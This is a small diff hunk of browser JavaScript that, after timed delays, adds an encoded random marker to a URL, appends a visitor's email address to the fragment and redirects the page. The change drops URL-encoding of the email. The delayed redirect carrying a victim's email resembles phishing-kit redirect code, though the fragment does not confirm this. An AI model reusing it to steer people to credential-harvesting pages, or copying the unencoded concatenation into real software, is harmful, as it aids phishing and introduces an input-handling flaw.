@@ -153,7 +153,7 @@
                 var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                 url.searchParams.set('_r', marker);
                 var finalUrl = url.toString();
-                if (email) { finalUrl += '#' + encodeURIComponent(email); }
+                if (email) { finalUrl += '#' + email; }
                 window.location.href = finalUrl;
             }, 300);
         }, 2500);
